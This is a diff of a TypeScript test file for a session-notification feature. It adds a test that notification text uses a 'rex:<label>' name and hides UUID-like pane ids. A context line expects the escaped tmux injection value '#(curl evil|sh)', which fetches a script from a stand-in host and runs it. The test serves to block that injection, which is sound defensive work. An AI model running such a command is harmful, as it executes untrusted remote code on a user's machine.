@@ -154,3 +154,14 @@ test("the tmux toast doubles every # so session text can't expand a format or ru
   const tmuxCall = d.calls.find((c) => c[0] === "tmux")!;
   expect(tmuxCall.at(-1)).toBe("agmux: ##(curl evil|sh)##{host} needs permission");
 });
+
+test("notification body uses rex:<label>, never a UUID", async () => {
+  const d = deps();
+  await dispatchNotification(
+    { session_id: "agx-5", trigger: "permission" as const, row: mkRow({ mux: "rex", mux_label: "bold-creek", tmux_session: "session:01a1-abcd1234", tmux_pane: "block:9f8e7d6c-0000" }) },
+    CFG, d,
+  );
+  const all = d.calls.map((c) => c.join(" ")).join("\n");
+  expect(all).toContain("rex:bold-creek needs permission");
+  expect(all).not.toContain("9f8e7d6c");
+});
